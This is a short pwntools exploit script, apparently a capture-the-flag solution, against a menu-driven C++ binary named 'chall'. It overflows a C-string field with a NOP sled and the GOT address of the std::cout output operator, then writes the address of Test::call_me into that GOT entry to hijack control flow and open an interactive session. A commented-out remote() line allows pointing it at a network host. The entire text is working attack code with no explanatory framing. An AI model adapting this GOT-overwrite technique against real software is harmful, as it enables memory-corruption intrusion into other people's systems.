from pwn import *

file = "./chall"
e = ELF(file)

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
io = process(file)
#io = remote(HOST, PORT)

def choice(idx: str):
    io.sendlineafter("choice:", idx)

def setcstr(s: bytes):
    io.sendlineafter("c_str: ", s)

def setstr(s: bytes):
    io.sendlineafter("str: ", s)

choice("3")
setstr(b"A"*0x10)
choice("1")
setcstr(b"\x90"*0x20+p64(e.got["_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc"])) #std::cout
choice("3")
setstr(p64(e.sym["_ZN4Test7call_meEv"]))

io.interactive()
